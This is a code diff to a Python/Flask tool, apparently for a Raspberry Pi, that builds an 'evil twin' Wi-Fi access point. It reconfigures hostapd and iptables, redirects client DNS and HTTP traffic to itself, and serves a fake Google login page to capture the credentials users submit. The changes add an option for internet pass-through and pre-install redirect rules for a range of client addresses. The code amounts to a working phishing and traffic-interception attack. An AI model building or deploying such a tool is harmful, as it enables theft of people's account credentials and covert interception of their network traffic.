@@ -8,6 +8,8 @@ import re
 import os
 from flask_socketio import SocketIO
 
+connect_to_wlan0_global = True
+
 def modify_evil_twin_info(evil_twin_name, evil_twin_password):
     # reading from .conf file
     with open("/home/user/pifi/evil_twin_hostapd_reference.conf", 'r') as file:
@@ -31,7 +33,9 @@ def modify_evil_twin_info(evil_twin_name, evil_twin_password):
     with open("/home/user/pifi/evil_twin_hostapd.conf", 'w') as file:
         file.writelines(lines)
 
-def create_evil_twin(evil_twin_name, evil_twin_password):
+def create_evil_twin(evil_twin_name, evil_twin_password, connect_to_wlan0):
+    global connect_to_wlan0_global
+    connect_to_wlan0_global = connect_to_wlan0
     modify_evil_twin_info(evil_twin_name, evil_twin_password)
     try:
         # Convert config file line endings
@@ -53,36 +57,37 @@ def create_evil_twin(evil_twin_name, evil_twin_password):
         # Enable IP forwarding
         subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
 
-        # Iptables NAT setup
-        subprocess.run(["sudo", "iptables", "-t", "nat", "-F", "POSTROUTING"], check=True)
-        subprocess.run(["sudo", "iptables", "-F", "FORWARD"], check=True)
-        subprocess.run(["sudo", "iptables", "-t", "nat", "-F", "PREROUTING"], check=True)
+        if connect_to_wlan0:
+            # Iptables NAT setup
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-F", "POSTROUTING"], check=True)
+            subprocess.run(["sudo", "iptables", "-F", "FORWARD"], check=True)
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-F", "PREROUTING"], check=True)
 
-        subprocess.run(["sudo", "apt-get", "install", "-y", "iptables-persistent"], check=True)
-        subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "wlan0", "-j", "MASQUERADE"], check=True)
-        subprocess.run([
-            "sudo", "iptables", "-A", "FORWARD", "-i", "wlan0", "-o", "wlan1",
-            "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"
-        ], check=True)
-        subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i", "wlan1", "-o", "wlan0", "-j", "ACCEPT"], check=True)
+            subprocess.run(["sudo", "apt-get", "install", "-y", "iptables-persistent"], check=True)
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "wlan0", "-j", "MASQUERADE"], check=True)
+            subprocess.run([
+                "sudo", "iptables", "-A", "FORWARD", "-i", "wlan0", "-o", "wlan1",
+                "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"
+            ], check=True)
+            subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-i", "wlan1", "-o", "wlan0", "-j", "ACCEPT"], check=True)
 
-        """
-        subprocess.run([
-            "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
-            "-i", "wlan1", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"
-        ], check=True)
-        """
+            """
+            subprocess.run([
+                "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
+                "-i", "wlan1", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"
+            ], check=True)
+            """
 
-        """
-        subprocess.run([
-            "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
-            "-i", "wlan1", "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"
-        ], check=True)
-        """
+            """
+            subprocess.run([
+                "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
+                "-i", "wlan1", "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"
+            ], check=True)
+            """
 
-        subprocess.run(["sudo", "iptables", "-L", "-n", "-v"], check=True)
+            subprocess.run(["sudo", "iptables", "-L", "-n", "-v"], check=True)
 
-        subprocess.run(["sudo", "netfilter-persistent", "save"], check=True)
+            subprocess.run(["sudo", "netfilter-persistent", "save"], check=True)
 
         # Set static IP on wlan1
         subprocess.run(["sudo", "ip", "addr", "flush", "dev", "wlan1"], check=True)
@@ -141,26 +146,26 @@ def remove_evil_twin():
         # Disable IP forwarding
         subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)
 
-        # Flush iptables rules added for Evil Twin
-        subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "POSTROUTING", "-o", "wlan0", "-j", "MASQUERADE"], check=False)
-        subprocess.run(["sudo", "iptables", "-D", "FORWARD", "-i", "wlan0", "-o", "wlan1",
-                        "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"], check=False)
-        subprocess.run(["sudo", "iptables", "-D", "FORWARD", "-i", "wlan1", "-o", "wlan0", "-j", "ACCEPT"], check=False)
+        if connect_to_wlan0_global:
+            # Flush iptables rules added for Evil Twin
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "POSTROUTING", "-o", "wlan0", "-j", "MASQUERADE"], check=False)
+            subprocess.run(["sudo", "iptables", "-F", "FORWARD"], check=False)
+            subprocess.run(["sudo", "iptables", "-t", "nat", "-F", "PREROUTING"], check=False)
 
-        """
-        subprocess.run([
-            "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
-            "-i", "wlan1", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"
-        ], check=True)
+            """
+            subprocess.run([
+                "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
+                "-i", "wlan1", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"
+            ], check=True)
 
-        subprocess.run([
-            "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
-            "-i", "wlan1", "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"
-        ], check=True)
-        """
+            subprocess.run([
+                "sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
+                "-i", "wlan1", "-p", "udp", "--dport", "53", "-j", "REDIRECT", "--to-port", "53"
+            ], check=True)
+            """
 
-        # Save iptables changes
-        subprocess.run(["sudo", "netfilter-persistent", "save"], check=False)
+            # Save iptables changes
+            subprocess.run(["sudo", "netfilter-persistent", "save"], check=False)
 
         print("Evil Twin Access Point removed and network restored.")
         return "done\n"
@@ -210,14 +215,9 @@ def watch_dns_queries():
             if match:
                 domain = match.group(1)
                 ip = match.group(2)
-                if ip not in clients_in_captive:
-                    add_new_captive_portal(ip)
-                    clients_in_captive.add(ip)
 
 def add_new_captive_portal(client_ip):
     print(f"[+] Adding captive portal for {client_ip}")
-    if client_ip in clients_in_captive:
-        return
     try:
         subprocess.run([
             "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
@@ -235,8 +235,6 @@ def add_new_captive_portal(client_ip):
 
 def switch_to_normal_mode(client_ip):
     print(f"[+] Removing captive portal for {client_ip}")
-    if client_ip not in clients_in_captive:
-        return
     try:
         # deleting old rules
         subprocess.run([
@@ -250,23 +248,16 @@ def switch_to_normal_mode(client_ip):
             "-j", "REDIRECT", "--to-port", "80"
         ], check=True)
 
-        for proto in ("udp", "tcp"):
-            subprocess.run([
-                "sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
-                "-i", "wlan1", "-s", client_ip, "-p", proto, "--dport", "53",
-                "-j", "DNAT", "--to-destination", "8.8.8.8:53"
-            ], check=True)
-
         subprocess.run(["sudo", "conntrack", "-D", "-s", client_ip], check=False)
         print(f"[+] Removed captive portal for {client_ip}")
     except Exception as e:
         print(f"[-] Error: {e}")
 
-def create_evil_twin_with_dns_spoof(evil_twin_name, evil_twin_password, sid, socketio):
+def create_evil_twin_with_dns_spoof(evil_twin_name, evil_twin_password, connect_to_wlan0, sid, socketio):
     socketio.emit("output", {"data": "Creating Evil Twin AP...\n"}, to=sid)
 
     result = remove_evil_twin()
-    result = create_evil_twin(evil_twin_name, evil_twin_password)
+    result = create_evil_twin(evil_twin_name, evil_twin_password, connect_to_wlan0)
 
     socketio.emit("output", {"data": "Created Evil Twin AP\n"}, to=sid)
 
@@ -275,6 +266,13 @@ def create_evil_twin_with_dns_spoof(evil_twin_name, evil_twin_password, sid, soc
     dns_watch_thread.start()
 
     socketio.emit("output", {"data": "Fake DNS server started, watching for queries...\n"}, to=sid)
+
+    for i in range(10, 51):
+        try:
+            add_new_captive_portal(f"10.0.0.{i}")
+            socketio.emit("output", {"data": f"IPTables rules for IP 10.0.0.{i} are added to the IPTables\n"}, to=sid)
+        except Exception as e:
+            print(f"Error adding captive portal for 10.0.0.{i}: {e}")
 
     app = Flask(__name__)
 
@@ -291,12 +289,6 @@ def create_evil_twin_with_dns_spoof(evil_twin_name, evil_twin_password, sid, soc
         if request.method == "GET":
             socketio.emit("output", {"data": f"Client {client_ip} connected, redirecting to login page...\n"}, to=sid)
             # When they first GET /login, put them into captive mode
-            if client_ip not in clients_in_captive:
-                print(f"[+] {client_ip} is in captive portal mode")
-                # Redirect DNS and HTTP traffic to the fake login page
-                add_new_captive_portal(client_ip)
-                clients_in_captive.add(client_ip)
-                print(clients_in_captive)
             return render_template("google_fake_login_page.html")
 
         # POST: they’ve submitted credentials
@@ -315,7 +307,7 @@ def create_evil_twin_with_dns_spoof(evil_twin_name, evil_twin_password, sid, soc
 
         # Now they’ll get real DNS (8.8.8.8) and real HTTP via wlan0 NAT
         return """
-        <h3 style="text-align: center; font-family: 'Roboto', sans-serif; margin-top: 100px;>Login successful!</h3>
+        <h3 style="text-align: center; font-family: 'Roboto', sans-serif; margin-top: 100px;">Login successful!</h3>
         """
     
     socketio.emit("output", {"data": "Captive portal started, waiting for clients...\n"}, to=sid)
